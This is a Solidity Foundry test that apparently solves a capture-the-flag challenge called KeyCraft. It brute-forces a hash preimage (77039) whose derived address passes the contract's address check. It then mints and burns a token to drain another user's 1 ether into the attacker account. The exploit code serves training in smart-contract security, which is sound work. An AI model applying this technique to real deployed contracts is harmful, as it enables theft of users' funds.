// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import {Test} from "forge-std/Test.sol";
import "../src/KeyCraft/KeyCraft.sol";

contract KC is Test {
    KeyCraft k;
    address owner;
    address user;
    address attacker;

    function setUp() public {
        owner = makeAddr("owner");
        user = makeAddr("user");
        attacker = address(uint160(uint256(keccak256(abi.encode(77039)))));

        vm.deal(user, 1 ether);

        vm.startPrank(owner);
        k = new KeyCraft("KeyCraft", "KC");
        vm.stopPrank();

        vm.startPrank(user);
        k.mint{value: 1 ether}(hex"dead");
        vm.stopPrank();
    }

    function testKeyCraft() public {
        vm.startPrank(attacker);

        //Solution
        
        //we find a number to be hash that could pass the modifier `checkAddress`
        
        // uint a;
        // for(uint256 i; i<100000; ++i) {
        //     a = uint160(uint256(keccak256(abi.encode(i))));
            
        //     a = a >> 108;
        //     a = a << 240;
        //     a = a >> 240;

        //     if (a == 13057) {
        //         console.log(i); // 77039
        //         break;
        //     }
        // }

        // mint a token first and burn it to get a ether
        k.mint(abi.encode(77039));
        k.burn(2); // 2 is tokenId

        vm.stopPrank();
        assertEq(attacker.balance, 1 ether);
    }
}